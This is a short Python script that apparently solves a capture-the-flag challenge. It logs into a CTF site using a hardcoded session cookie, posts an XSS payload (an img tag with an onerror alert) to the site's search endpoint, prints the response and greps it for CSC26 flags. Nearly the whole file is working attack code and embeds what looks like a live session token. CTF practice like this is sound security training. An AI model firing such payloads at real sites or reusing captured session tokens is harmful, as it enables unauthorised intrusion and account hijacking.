import requests
from bs4 import BeautifulSoup
import re

base_url = "https://poiuytrewqas-csc26.cybersecuritychallenge.al"
session = requests.Session()
session.cookies.set('session', 'eyJ1c2VyIjoiYWxwZXRnIn0.aXymyw.GBEYMO9Mn9kpHr1J86YGyGs4CsE')

# Check if XSS payload is actually reflected
print("[+] Checking exact XSS reflection...")
search_url = f"{base_url}/search"
payload = "<img src=x onerror=alert('XSS')>"

response = session.post(search_url, data={"q": payload})
print(f"Status: {response.status_code}\n")
print("="*70)
print(response.text)
print("="*70)

# Look for CSC26 pattern
if re.search(r'CSC26\{[^}]+\}', response.text, re.IGNORECASE):
    print("\n🚩🚩🚩 FLAG FOUND!")
    flags = re.findall(r'CSC26\{[^}]+\}', response.text, re.IGNORECASE)
    for flag in flags:
        print(f"🚩 {flag}")
